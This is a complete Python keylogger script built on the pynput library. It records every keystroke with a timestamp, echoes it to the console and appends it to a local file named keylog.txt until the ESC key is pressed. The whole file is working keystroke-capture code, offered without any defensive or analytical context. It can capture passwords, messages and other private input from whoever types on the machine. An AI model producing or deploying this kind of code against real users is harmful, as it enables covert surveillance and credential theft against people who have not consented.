from pynput import keyboard
from datetime import datetime

LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        key_data = key.char
    except AttributeError:
        key_data = f"[{key}]"

    log_entry = f"{datetime.now()} - {key_data}\n"

    print(log_entry.strip())

    with open(LOG_FILE, "a") as file:
        file.write(log_entry)

def on_release(key):
    if key == keyboard.Key.esc:
        print("\nKeylogger stopped.")
        return False

if __name__ == "__main__":
    print("Starting Keylogger... Press ESC to stop.\n")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()